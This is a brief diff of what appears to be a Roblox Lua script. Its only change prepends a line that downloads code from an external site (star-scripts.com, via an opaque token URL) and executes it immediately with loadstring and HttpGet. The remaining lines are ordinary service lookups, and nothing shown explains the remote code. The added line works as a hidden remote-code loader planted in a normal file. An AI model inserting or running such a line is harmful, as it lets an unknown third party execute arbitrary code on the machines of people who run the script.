@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://star-scripts.com/api/run/rTyHmBnkkcD8KvZUuGj1YsTJ5N7kqUAd"))()
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
 local HttpService = game:GetService("HttpService")
